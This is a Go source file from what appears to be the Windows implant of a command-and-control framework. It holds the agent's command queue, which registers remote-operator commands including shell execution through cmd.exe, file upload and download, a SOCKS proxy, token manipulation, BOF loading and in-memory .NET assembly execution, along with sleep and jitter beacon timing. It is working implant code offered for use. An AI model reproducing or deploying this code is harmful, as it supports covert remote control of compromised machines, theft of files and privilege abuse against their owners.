// server/docker/payloads/Windows/command_queue.go
//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"
)

// CommandQueue manages the processing of commands
type CommandQueue struct {
	mu              sync.Mutex
	commands        []Command
	cmdRegistry     map[string]CommandInterface
	cmdContext      *CommandContext
	activeDownloads map[string]*DownloadInfo
	activeJobs      map[string]JobInfo
	activeUploads   map[string]*UploadInfo
}

// NewCommandQueue creates a new command queue instance
func NewCommandQueue() *CommandQueue {
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}

	ctx := &CommandContext{
		WorkingDir:  currentDir,
		SudoSession: nil,                     // Initialize SudoSession as nil
		SessionEnv:  make(map[string]string), // Initialize session environment map
		TokenStore:  nil,                     // Will be initialized for Windows
	}

	// Initialize platform-specific features
	if runtime.GOOS == "windows" {
		// Initialize Windows token store
		ctx.TokenStore = initializeWindowsTokenStore()
	}

	queue := &CommandQueue{
		commands:        make([]Command, 0, 10),                // Pre-allocate for typical queue depth
		cmdRegistry:     make(map[string]CommandInterface, 32), // Pre-allocate for all commands
		cmdContext:      ctx,
		activeDownloads: make(map[string]*DownloadInfo, 4),   // Pre-allocate for concurrent downloads
		activeJobs:      make(map[string]JobInfo, 8),         // Pre-allocate for concurrent jobs
		activeUploads:   make(map[string]*UploadInfo, 4),     // Pre-allocate for concurrent uploads
	}

	// Register all core commands
	queue.RegisterCommand(&CdCommand{})
	queue.RegisterCommand(&LsCommand{})
	queue.RegisterCommand(&PwdCommand{})
	queue.RegisterCommand(&DownloadCommand{})
	queue.RegisterCommand(&UploadCommand{})
	queue.RegisterCommand(&ShellCommand{})
	queue.RegisterCommand(&SocksCommand{})
	queue.RegisterCommand(&JobKillCommand{})
	queue.RegisterCommand(&ExitCommand{})
	queue.RegisterCommand(&SleepCommand{})
	queue.RegisterCommand(&RekeyCommand{})
	queue.RegisterCommand(&EnvCommand{})
	queue.RegisterCommand(&CatCommand{})
	queue.RegisterCommand(&HashCommand{})
	queue.RegisterCommand(&HashDirCommand{})
	queue.RegisterCommand(&PSCommand{})
	queue.RegisterCommand(&RmCommand{})
	queue.RegisterCommand(&WhoamiCommand{})
	queue.RegisterCommand(&TokenCommand{})
	queue.RegisterCommand(&Rev2SelfCommand{})
	queue.RegisterCommand(&BOFCommand{})
	queue.RegisterCommand(&BOFAsyncCommand{})
	queue.RegisterCommand(&BOFJobsCommand{})
	queue.RegisterCommand(&BOFOutputCommand{})
	queue.RegisterCommand(&BOFKillCommand{})
	queue.RegisterCommand(&InlineAssemblyJobsCommand{})
	queue.RegisterCommand(&InlineAssemblyOutputCommand{})
	queue.RegisterCommand(&InlineAssemblyKillCommand{})
	queue.RegisterCommand(&InlineAssemblyJobsCleanCommand{})
	queue.RegisterCommand(&InlineAssemblyJobsStatsCommand{})
	queue.RegisterCommand(&InlineAssemblyCommand{})
	queue.RegisterCommand(&InlineAssemblyAsyncCommand{})

	// Print all registered commands
	fmt.Println()

	// Start cleanup goroutine for stale transfers
	go queue.cleanupStaleTransfers()

	return queue
}

// RegisterCommand adds a command to the registry
func (cq *CommandQueue) RegisterCommand(cmd CommandInterface) {
	cq.cmdRegistry[cmd.Name()] = cmd
}

// Helper function to apply session environment before executing any command
func (cq *CommandQueue) applySessionEnvironment() {
	cq.cmdContext.mu.RLock()
	// Quick check without iteration - most commands have no session env
	if len(cq.cmdContext.SessionEnv) == 0 {
		cq.cmdContext.mu.RUnlock()
		return
	}
	defer cq.cmdContext.mu.RUnlock()

	for key, value := range cq.cmdContext.SessionEnv {
		os.Setenv(key, value)
	}
}

// cleanupStaleTransfers periodically removes stale upload/download operations
// Uses dynamic timeouts based on current sleep/jitter to account for mid-transfer changes
func (cq *CommandQueue) cleanupStaleTransfers() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()

		// Calculate dynamic timeout based on current sleep/jitter values
		// This handles cases where sleep is changed mid-transfer
		uploadTimeout := calculateTransferTimeout(false)
		downloadTimeout := calculateTransferTimeout(true)

		cq.mu.Lock()

		// Cleanup stale uploads with dynamic timeout
		for filename, info := range cq.activeUploads {
			if now.Sub(info.LastUpdate) > uploadTimeout {
				// Free memory from stored chunks
				info.Chunks = nil
				delete(cq.activeUploads, filename)
			}
		}

		// Cleanup stale downloads with dynamic timeout
		for filename, info := range cq.activeDownloads {
			if now.Sub(info.LastUpdate) > downloadTimeout {
				delete(cq.activeDownloads, filename)
			}
		}

		cq.mu.Unlock()
	}
}

// calculateTransferTimeout computes appropriate timeout based on current sleep/jitter
// Accounts for the fact that sleep can be changed mid-transfer via the sleep command
func calculateTransferTimeout(isDownload bool) time.Duration {
	// Parse current sleep value (global var, can change during runtime)
	sleepSeconds := 60 // Default fallback
	if parsedSleep, err := strconv.Atoi(sleep); err == nil && parsedSleep > 0 {
		sleepSeconds = parsedSleep
	}

	// Parse current jitter value (global var, can change during runtime)
	jitterPercent := 10 // Default fallback
	if parsedJitter, err := strconv.Atoi(jitter); err == nil && parsedJitter >= 0 {
		jitterPercent = parsedJitter
	}

	// Calculate max delay between chunks accounting for jitter
	// Max delay = sleep * (1 + jitter/100)
	maxDelay := float64(sleepSeconds) * (1.0 + float64(jitterPercent)/100.0)

	// Safety multiplier: allow for 10 consecutive max-jitter polling cycles with no chunk
	// This is conservative but prevents false positives from network issues/queuing
	safetyMultiplier := 10.0
	if isDownload {
		// Downloads may need more time due to server-side processing
		safetyMultiplier = 15.0
	}

	timeout := time.Duration(maxDelay*safetyMultiplier) * time.Second

	// Enforce minimum timeout of 10 minutes to prevent premature cleanup
	minTimeout := 10 * time.Minute
	if timeout < minTimeout {
		timeout = minTimeout
	}

	// Enforce maximum timeout of 2 hours to prevent unbounded memory retention
	maxTimeout := 2 * time.Hour
	if timeout > maxTimeout {
		timeout = maxTimeout
	}

	return timeout
}

// AddCommands parses and adds commands to the queue
func (cq *CommandQueue) AddCommands(jsonData string) error {
	//fmt.Printf("DEBUG: AddCommands received JSON: %s\n", jsonData)

	var commands []Command
	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
		return fmt.Errorf("failed to parse commands: %v", err)
	}

	cq.mu.Lock()
	defer cq.mu.Unlock()

	cq.commands = append(cq.commands, commands...)
	//fmt.Printf("Added %d commands to queue\n", len(commands))

	/*
		// Debug: print details of each command
		for i, cmd := range commands {
		}
	*/
	return nil
}

// executeShellCommand executes a command through the system shell
func executeShellCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		// On Windows, use cmd.exe
		cmd = exec.Command("cmd", "/c", command)
	} else {
		// On Unix-like systems, use sh
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

// executeExternalCommand handles execution of system commands
func (cq *CommandQueue) executeExternalCommand(cmd Command, cmdType string, args []string) (*CommandResult, error) {
	cmdPath, err := exec.LookPath(cmdType)
	if err != nil {
		return &CommandResult{
			Command:     cmd,
			Error:       fmt.Errorf("command not found: %v", err),
			ErrorString: fmt.Sprintf("command not found: %v", err),
			ExitCode:    127,
		}, nil
	}

	execCmd := exec.Command(cmdPath, args...)
	execCmd.Dir = cq.cmdContext.WorkingDir
	output, err := execCmd.CombinedOutput()

	result := &CommandResult{
		Command: cmd,
		Output:  string(output),
	}

	if err != nil {
		result.Error = err
		result.ErrorString = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			result.ExitCode = exitErr.ExitCode()
		} else {
			result.ExitCode = 1
		}
	}

	return result, nil
}

// parseCommandLine properly handles quoted arguments and spaces in paths
// It supports both single and double quotes
func parseCommandLine(cmdLine string) []string {
	args := make([]string, 0, 8) // Pre-allocate for typical command with ~8 args
	var current strings.Builder
	current.Grow(64) // Pre-allocate builder buffer
	var inQuote rune
	var escaped bool

	// Iterate directly over string as runes (no intermediate allocation)
	for _, r := range cmdLine {
		// Handle escape sequences
		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}

		// Check for escape character
		if r == '\\' {
			// Only escape quotes and backslashes within quotes
			if inQuote != 0 {
				escaped = true
				continue
			}
			// Otherwise, treat as regular backslash (for Windows paths)
			current.WriteRune(r)
			continue
		}

		// Handle quotes
		if inQuote != 0 {
			if r == inQuote {
				// End of quoted section
				inQuote = 0
			} else {
				current.WriteRune(r)
			}
			continue
		}

		// Start of quoted section
		if r == '"' || r == '\'' {
			inQuote = r
			continue
		}

		// Handle whitespace outside quotes
		if unicode.IsSpace(r) {
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
			continue
		}

		// Regular character
		current.WriteRune(r)
	}

	// Add any remaining content
	if current.Len() > 0 {
		args = append(args, current.String())
	}

	return args
}

// parseDownloadCommand specifically handles the download command
// The entire argument after "download" should be treated as a single file path
func parseDownloadCommand(cmdLine string) []string {
	// Remove any leading/trailing whitespace
	cmdLine = strings.TrimSpace(cmdLine)

	// Check if it starts with "download" (case-insensitive)
	if !strings.HasPrefix(strings.ToLower(cmdLine), "download") {
		// Not a download command, use regular parsing
		return parseCommandLine(cmdLine)
	}

	// Check if there's anything after "download"
	if len(cmdLine) <= 8 { // len("download") = 8
		return []string{"download"}
	}

	// Make sure there's a space after "download"
	if cmdLine[8] != ' ' && cmdLine[8] != '\t' {
		// Not a properly formatted download command
		return parseCommandLine(cmdLine)
	}

	// Get everything after "download " as the file path
	remainder := strings.TrimSpace(cmdLine[8:])

	if remainder == "" {
		return []string{"download"}
	}

	// For download, treat everything after "download " as the file path
	// But still respect quotes if they're used
	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		// Remove surrounding quotes
		remainder = remainder[1 : len(remainder)-1]
	}

	return []string{"download", remainder}
}

// parseUploadCommand specifically handles the upload command
// Upload can have 1 or 2 arguments, but we need to handle spaces in paths
func parseUploadCommand(cmdLine string) []string {
	// Remove any leading/trailing whitespace
	cmdLine = strings.TrimSpace(cmdLine)

	// Check if it starts with "upload" (case-insensitive)
	if !strings.HasPrefix(strings.ToLower(cmdLine), "upload") {
		// Not an upload command, use regular parsing
		return parseCommandLine(cmdLine)
	}

	// Check if there's anything after "upload"
	if len(cmdLine) <= 6 { // len("upload") = 6
		return []string{"upload"}
	}

	// Make sure there's a space after "upload"
	if cmdLine[6] != ' ' && cmdLine[6] != '\t' {
		// Not a properly formatted upload command
		return parseCommandLine(cmdLine)
	}

	// Get everything after "upload "
	remainder := strings.TrimSpace(cmdLine[6:])

	if remainder == "" {
		return []string{"upload"}
	}

	// For upload, we need to handle potential spaces in the path
	// Upload typically just has one argument (the remote path)
	// The client handles the local file selection

	// Check if the path is quoted
	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		// Remove surrounding quotes
		remainder = remainder[1 : len(remainder)-1]
	}

	// Return upload command with the full path as a single argument
	return []string{"upload", remainder}
}
